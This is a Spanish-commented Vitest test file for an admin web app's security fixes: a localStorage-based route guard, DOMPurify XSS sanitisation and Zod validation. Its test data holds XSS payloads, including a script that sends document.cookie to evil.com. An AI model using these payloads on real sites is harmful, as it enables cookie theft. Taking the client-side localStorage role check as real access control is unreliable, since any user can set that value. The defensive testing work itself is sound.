/**
 * Tests para Corrección B: Explotación de Software en Clientes
 *
 * Vulnerabilidades cubiertas:
 * - B-01: Cliente como objeto de ataque (CWE-425: Directorescape)
 * - B-02: XSS Prevention (CWE-79: Cross-site Scripting)
 *
 * Las correcciones incluyen:
 * 1. Auth Guard en layout.tsx que previene acceso no autorizado a rutas admin
 * 2. Sanitización con DOMPurify para prevenir ejecución de scripts maliciosos
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, waitFor } from '@testing-library/react';
import { useRouter } from 'next/navigation';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import DOMPurify from 'dompurify';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Mock de next/navigation
vi.mock('next/navigation', () => ({
  useRouter: vi.fn(() => ({
    push: vi.fn(),
    replace: vi.fn(),
    prefetch: vi.fn(),
    back: vi.fn(),
    forward: vi.fn(),
    refresh: vi.fn()
  })),
  usePathname: () => '/',
}));

describe('B: Explotación de Software en Clientes', () => {

  // ============================================================
  // PARTE 1: Auth Guard (CWE-425 / CWE-862) - Protección de Rutas
  // ============================================================
  describe('B-01: Protección de Rutas en Cliente (Auth Guard)', () => {

    it('ANTIGUO: layout.tsx SIN Auth Guard (VULNERABLE)', async () => {
      /**
       * EVIDENCIA DEL CÓDIGO VULNERABLE (antes del fix):
       *
       * function AdminLayout({ children }) {
       *   // Sin validación de autenticación
       *   return <div>{children}</div>;  // ❌Cualquier usuario podía acceder
       * }
       *
       * Un atacante podía navegar directamente a /dashboard sin autenticación.
       */
      const layoutPath = path.resolve(__dirname, '../app/(admin)/layout.tsx');
      const content = fs.readFileSync(layoutPath, 'utf-8');

      // Verificar que el código corregido tiene el Auth Guard
      expect(content).toContain('localStorage.getItem("userRole")');
      expect(content).toContain('router.push("/auth")');
    });

    it('CORREGIDO: Expulsa al usuario si no tiene rol en localStorage', async () => {
      const { default: AdminLayout } = await import('../app/(admin)/layout.tsx');

      const pushMock = vi.fn();
      vi.mocked(useRouter).mockReturnValue({
        push: pushMock,
        replace: vi.fn(),
        prefetch: vi.fn(),
        back: vi.fn(),
        forward: vi.fn(),
        refresh: vi.fn()
      } as any);

      // Asegurar que no hay rol en localStorage
      localStorage.clear();

      render(
        <AdminLayout>
          <div data-testid="protected-content">Contenido Secreto</div>
        </AdminLayout>
      );

      // Debe haber llamado a router.push("/auth")
      await waitFor(() => {
        expect(pushMock).toHaveBeenCalledWith('/auth');
      }, { timeout: 2000 });

      // El contenido secreto no debe renderizarse
      expect(screen.queryByTestId('protected-content')).toBeNull();
    });

    it('CORREGIDO: Permite acceso si tiene rol admin', async () => {
      const { default: AdminLayout } = await import('../app/(admin)/layout.tsx');

      const pushMock = vi.fn();
      vi.mocked(useRouter).mockReturnValue({
        push: pushMock,
        replace: vi.fn(),
        prefetch: vi.fn(),
        back: vi.fn(),
        forward: vi.fn(),
        refresh: vi.fn()
      } as any);

      // Simular usuario autenticado
      localStorage.setItem('userRole', 'admin');

      render(
        <AdminLayout>
          <div data-testid="protected-content">Contenido Secreto</div>
        </AdminLayout>
      );

      // No debe redirigir
      await waitFor(() => {
        expect(pushMock).not.toHaveBeenCalled();
      }, { timeout: 2000 });

      expect(screen.getByTestId('protected-content')).toBeInTheDocument();

      // Cleanup
      localStorage.clear();
    });
  });

  // ============================================================
  // PARTE 2: XSS Prevention (CWE-79)
  // ============================================================
  describe('B-02: Sanitización XSS (CWE-79)', () => {

    it('ANTIGUO: auth/page.tsx SIN sanitización (VULNERABLE)', async () => {
      /**
       * EVIDENCIA DEL CÓDIGO VULNERABLE (antes del fix):
       *
       * const dirtyMessage = `Error: ${data.message}`;
       * setMessage(dirtyMessage);  // ❌ Directly rendered, could execute scripts
       *
       * Un atacante que comprometiera el servidor podría injectar scripts
       * que se ejecutarían en el navegador del cliente.
       */
      const pagePath = path.resolve(__dirname, '../app/auth/page.tsx');
      const content = fs.readFileSync(pagePath, 'utf-8');

      // Verificar que el código corregido tiene DOMPurify
      expect(content).toContain('DOMPurify.sanitize');
    });

    it('CORREGIDO: DOMPurify limpia etiquetas maliciosas', () => {
      // Simulamos la sanitización que se aplica en auth/page.tsx
      const payloadMalicioso = 'Error: Credenciales inválidas <script>alert("XSS")</script><img src=x onerror="alert(1)">';

      const cleanMessage = DOMPurify.sanitize(payloadMalicioso);

      // La etiqueta script debe haber sido removida
      expect(cleanMessage).not.toContain('<script>');
      expect(cleanMessage).not.toContain('onerror=');
      // Debe mantener el texto legítimo
      expect(cleanMessage).toContain('Credenciales inválidas');
    });

    it('CORREGIDO: DOMPurify permite etiquetas seguras', () => {
      const payloadConImg = 'Error: Datos incorrectos <strong>prueba</strong><img src="safe.png">';

      const cleanMessage = DOMPurify.sanitize(payloadConImg);

      // Etiquetas seguras deben mantenerse
      expect(cleanMessage).toContain('<strong>prueba</strong>');
      expect(cleanMessage).toContain('<img src="safe.png">');
    });
  });

  // ============================================================
  // PARTE 3: Validación de Integridad de Datos del API
  // ============================================================
  describe('B-03: Integridad de Datos Recibidos (Client as Attack Object)', () => {

    it('ANTIGUO: administradores/page.tsx SIN validación de integridad (VULNERABLE)', async () => {
      /**
       * EVIDENCIA DEL CÓDIGO VULNERABLE (antes del fix):
       *
       * const res = await fetch(`${api}/admin/vistaAdminMaquina`);
       * const data = await res.json();
       * setMaquinas(data.data);  // ❌ Sin validar estructura, podría contener objetos inesperados
       *
       * Un atacante que comprometiera el API podría enviar datos maliciosos
       * que se renderizarían directamente sin validación.
       */
      const pagePath = path.resolve(__dirname, '../app/(admin)/administradores/page.tsx');
      const content = fs.readFileSync(pagePath, 'utf-8');

      // Verificar que el código usa Zod para validación
      expect(content).toContain('adminMaquinaSchema');
      expect(content).toContain('safeParse');
    });

    it('CORREGIDO: Zod safeParse rechaza datos maliciosos', async () => {
      const { adminMaquinaSchema } = await import('../src/lib/security-schemas');

      // Datos maliciosos simulados (ataque de integridad)
      const maliciousData = {
        id_maquina: 1,
        tipo: '<img src=x onerror="alert(document.cookie)">',
        modelo: '{"malicious": true}',
        marca: '<script>fetch("http://evil.com?c=" + document.cookie)</script>',
        estado: '<svg onload="alert(1)"></svg>',
        ultima_revision: null,
        nombre_admin: null
      };

      const result = adminMaquinaSchema.safeParse(maliciousData);

      // El parseo debe succeed porque Zod transforma (sanitiza) los datos
      expect(result.success).toBe(true);

      // Los datos transformados deben estar limpios
      if (result.success) {
        expect(result.data.tipo).not.toContain('<img');
        expect(result.data.tipo).not.toContain('onerror');
        expect(result.data.modelo).not.toContain('{');
        expect(result.data.marca).not.toContain('<script>');
      }
    });

    it('CORREGIDO: Zod rechaza estructura completamente inválida', async () => {
      const { adminMaquinaSchema } = await import('../src/lib/security-schemas');

      // Datos con estructura completamente incorrecta
      const invalidData = {
        id_maquina: "no es numero",
        tipo: 123,
        modelo: null,
        marca: undefined,
        estado: "no es numero"
      };

      const result = adminMaquinaSchema.safeParse(invalidData);

      // Debe rechazar datos con tipos incorrectos
      expect(result.success).toBe(false);
    });
  });

  // ============================================================
  // PARTE 4: Demostración de Vulnerabilidad (Reversión Temporal)
  // ============================================================
  describe('Demostración de vulnerabilidad (reversión temporal)', () => {
    const layoutPath = path.resolve(__dirname, '../app/(admin)/layout.tsx');
    let originalLayoutContent;

    beforeEach(() => {
      originalLayoutContent = fs.readFileSync(layoutPath, 'utf-8');
    });

    afterEach(() => {
      fs.writeFileSync(layoutPath, originalLayoutContent, 'utf-8');
    });

    it('VULNERABLE: Sin Auth Guard, cualquier usuario puede acceder al dashboard', async () => {
      // Crear versión vulnerable del layout (sin el useEffect de validación)
      const vulnerableContent = originalLayoutContent.replace(
        /const userRole = localStorage\.getItem\("userRole"\);[\s\S]*?if \(!userRole\) \{[\s\S]*?router\.push\/auth"\);[\s\S]*?\}/,
        ''
      );

      fs.writeFileSync(layoutPath, vulnerableContent, 'utf-8');

      // Limpiar cache de módulos
      vi.resetModules();

      // Importar layout vulnerable
      const { default: VulnerableLayout } = await import('../app/(admin)/layout.tsx');

      const pushMock = vi.fn();
      vi.mocked(useRouter).mockReturnValue({
        push: pushMock,
        replace: vi.fn(),
        prefetch: vi.fn(),
        back: vi.fn(),
        forward: vi.fn(),
        refresh: vi.fn()
      } as any);

      localStorage.clear();

      render(
        <VulnerableLayout>
          <div data-testid="content">Test</div>
        </VulnerableLayout>
      );

      // SIN el Auth Guard, NO se llama a router.push("/auth")
      await waitFor(() => {
        expect(pushMock).not.toHaveBeenCalled();
      }, { timeout: 2000 });

      // El contenido se renderiza (acceso no autorizado)
      expect(screen.getByTestId('content')).toBeInTheDocument();
    });

    it('CORREGIDO: Con Auth Guard, usuarios sin rol son expulsados', async () => {
      // Verificar que el archivo tiene el fix
      const currentContent = fs.readFileSync(layoutPath, 'utf-8');
      expect(currentContent).toContain('localStorage.getItem("userRole")');

      const { default: AdminLayout } = await import('../app/(admin)/layout.tsx');

      const pushMock = vi.fn();
      vi.mocked(useRouter).mockReturnValue({
        push: pushMock,
        replace: vi.fn(),
        prefetch: vi.fn(),
        back: vi.fn(),
        forward: vi.fn(),
        refresh: vi.fn()
      } as any);

      localStorage.clear();

      render(
        <AdminLayout>
          <div data-testid="protected">Protected</div>
        </AdminLayout>
      );

      await waitFor(() => {
        expect(pushMock).toHaveBeenCalledWith('/auth');
      }, { timeout: 2000 });
    });
  });
});